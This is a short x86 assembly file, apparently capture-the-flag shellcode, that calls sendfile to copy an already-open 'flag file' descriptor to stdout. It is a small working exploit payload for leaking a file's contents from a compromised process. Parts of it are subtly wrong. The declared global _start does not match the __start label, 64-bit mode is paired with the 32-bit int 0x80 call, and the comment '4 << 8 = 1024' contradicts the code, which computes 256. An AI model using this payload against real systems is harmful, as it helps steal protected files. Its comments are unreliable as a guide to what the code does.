BITS 64
    GLOBAL _start
section .text

__start:
    xor eax, eax    ; clean
    xor ebx, ebx    ; clean
    xor ecx, ecx    ; clean
    xor edx, edx    ; clean offset
    xor esi, esi    ; clean

    ;; sendfile(STDOUT, FLAG_FILE, x, y)
    mov al, 0xbb    ; sendfile
    mov bl, 0x1    ; stdout
    mov cl, 0x3    ; flag file fd
    inc esi
    shl esi, 8      ; count (4 << 8 = 1024)
    int 0x80
    ;ret
